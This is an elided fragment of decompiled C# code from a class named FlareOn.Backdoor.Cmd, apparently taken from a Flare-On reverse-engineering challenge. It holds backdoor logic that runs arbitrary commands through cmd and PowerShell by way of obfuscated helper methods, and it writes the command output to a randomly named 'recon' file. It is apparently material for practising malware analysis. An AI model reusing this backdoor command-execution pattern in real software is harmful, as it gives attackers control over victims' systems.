...
namespace FlareOn.Backdoor
{
	...
	public class Cmd
	{
		...
		{
			return Cmd.flare_05("cmd", "/c " + c + " && exit");
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002398 File Offset: 0x00009398
		public static string ExecCmd(string c)
		{
			string result;
			try
			{
				result = Cmd.flared_02(c);
			}
		...
		public static string Powershell(string c)
		{
			string result;
			try
			{
				result = Cmd.flared_03(c);
			}
			catch (InvalidProgramException e)
			{
				result = (string)Util.flare_70(e, new object[]
		...
		public static string _ShrinkCmdResult(string r)
		{
			string text = r;
			try
			{
			...
			File.WriteAllText("flare.agent.recon." + new string((from s in Enumerable.Repeat<string>(Config.chars_counter, 5)
			select s[FLARE10.r.Next(s.Length)]).ToArray<char>()), text);
			return text.Substring(0, 12);
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002678 File Offset: 0x00009678
		public static string ShrinkCmdResult(string r)
		{
			string result;
			try
			{
